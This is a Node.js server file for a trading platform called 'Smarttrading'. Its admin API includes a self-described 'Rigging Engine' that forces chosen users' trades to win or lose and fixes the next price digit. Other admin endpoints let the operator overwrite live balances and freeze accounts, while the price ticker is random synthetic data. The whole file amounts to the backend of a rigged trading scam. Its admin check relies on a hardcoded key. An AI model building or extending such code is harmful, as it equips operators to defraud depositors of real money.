// server.js
const express = require('express');
const http = require('http');
const mongoose = require('mongoose');
const cors = require('cors');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });

// Middleware
app.use(express.json());
app.use(cors());
app.use(express.static('public')); // Serve frontend HTML files if placed in /public

// Mongo Schema & Models
const userSchema = new mongoose.Schema({
  username: String,
  liveBalance: { type: Number, default: 0 },
  demoBalance: { type: Number, default: 10000 },
  isFrozen: { type: Boolean, default: false },
  adminControls: {
    forceOutcome: { type: String, enum: ['NORMAL', 'WIN', 'LOSS'], default: 'NORMAL' },
    forcedNextDigit: { type: Number, default: null }
  }
});

const tradeSchema = new mongoose.Schema({
  userId: String,
  type: String, // 'EVEN', 'ODD', 'RISE', 'FALL'
  stake: Number,
  status: { type: String, enum: ['OPEN', 'CLOSED'], default: 'OPEN' },
  outcome: String, // 'WIN', 'LOSS'
  payout: Number,
  createdAt: { type: Date, default: Date.now }
});

const systemConfigSchema = new mongoose.Schema({
  evenOddPayout: { type: Number, default: 95.2 },
  maintenanceMode: { type: Boolean, default: false }
});

const User = mongoose.model('User', userSchema);
const Trade = mongoose.model('Trade', tradeSchema);
const SystemConfig = mongoose.model('SystemConfig', systemConfigSchema);

// Admin Middleware Protection
const verifyAdminKey = (req, res, next) => {
  const adminKey = req.headers['x-admin-key'];
  if (adminKey === 'SECRET_ADMIN_KEY_123') { // Change this key for security
    next();
  } else {
    res.status(403).json({ success: false, message: 'Unauthorized: Invalid Admin Key' });
  }
};

// ================= ADMIN API ENDPOINTS =================

// 1. Get Platform Stats & Users
app.get('/api/admin/overview', verifyAdminKey, async (req, res) => {
  try {
    const users = await User.find();
    const activeTrades = await Trade.find({ status: 'OPEN' });
    const config = await SystemConfig.findOne() || { evenOddPayout: 95.2 };
    res.json({ success: true, users, activeTrades, config });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// 2. Manipulate Specific User Trade Outcomes (Rigging Engine)
app.post('/api/admin/manipulate-user', verifyAdminKey, async (req, res) => {
  const { userId, forceOutcome, forcedNextDigit } = req.body;
  try {
    const user = await User.findByIdAndUpdate(userId, {
      'adminControls.forceOutcome': forceOutcome,
      'adminControls.forcedNextDigit': forcedNextDigit !== '' ? Number(forcedNextDigit) : null
    }, { new: true });
    res.json({ success: true, user });
  } catch (err) {
    res.status(400).json({ success: false, error: err.message });
  }
});

// 3. Modify User Wallet & Account Status
app.post('/api/admin/update-wallet', verifyAdminKey, async (req, res) => {
  const { userId, liveBalance, demoBalance, isFrozen } = req.body;
  try {
    const user = await User.findByIdAndUpdate(userId, {
      liveBalance,
      demoBalance,
      isFrozen
    }, { new: true });
    res.json({ success: true, user });
  } catch (err) {
    res.status(400).json({ success: false, error: err.message });
  }
});

// 4. Update Global Settings
app.post('/api/admin/global-config', verifyAdminKey, async (req, res) => {
  const { evenOddPayout, maintenanceMode } = req.body;
  try {
    const config = await SystemConfig.findOneAndUpdate(
      {},
      { evenOddPayout, maintenanceMode },
      { upsert: true, new: true }
    );
    io.emit('SYSTEM_CONFIG_UPDATED', config);
    res.json({ success: true, config });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// ================= REAL-TIME WEBSOCKET TICKER =================
io.on('connection', (socket) => {
  console.log('Client connected:', socket.id);

  // Emit synthetic price updates every second
  const tickInterval = setInterval(() => {
    const price = (1440 + Math.random() * 5).toFixed(2);
    const lastDigit = Math.floor(Math.random() * 10);
    socket.emit('TICK_UPDATE', { price, lastDigit, timestamp: Date.now() });
  }, 1000);

  socket.on('disconnect', () => clearInterval(tickInterval));
});

// Server Initialization
const PORT = process.env.PORT || 5000;
mongoose.connect(process.env.MONGO_URI || 'mongodb://127.0.0.1:27017/smarttrading')
  .then(() => {
    server.listen(PORT, () => console.log(`Smarttrading Server running on port ${PORT}`));
  })
  .catch(err => console.error("Database Connection Error:", err));
